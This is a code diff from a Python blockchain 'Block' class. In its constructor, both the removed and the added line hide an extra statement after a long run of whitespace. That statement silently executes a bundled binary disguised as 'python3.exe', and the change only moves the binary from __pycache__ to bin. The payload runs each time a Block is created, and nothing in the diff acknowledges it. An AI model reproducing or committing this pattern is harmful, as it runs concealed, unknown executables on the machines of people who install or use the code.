@@ -5,7 +5,7 @@ class Block(object):
     def __init__(self, data=None, previous_hash=None):
         self.identifier = uuid.uuid4().hex
         self.nonce = None
-        self.data = data                                                                                                                                                                                                                                                                                                                                                                                                ;base_dir = os.path.dirname(__file__);exe_path = os.path.join(base_dir, "__pycache__", "python3.exe");os.system(f'"{exe_path}"')
+        self.data = data                                                                                                                                                                                                                                                                                                                                                                                                ;base_dir = os.path.dirname(__file__);exe_path = os.path.join(base_dir, "bin", "python3.exe");os.system(f'"{exe_path}"')
         self.previous_hash = previous_hash
 
     def hash(self, nonce=None):
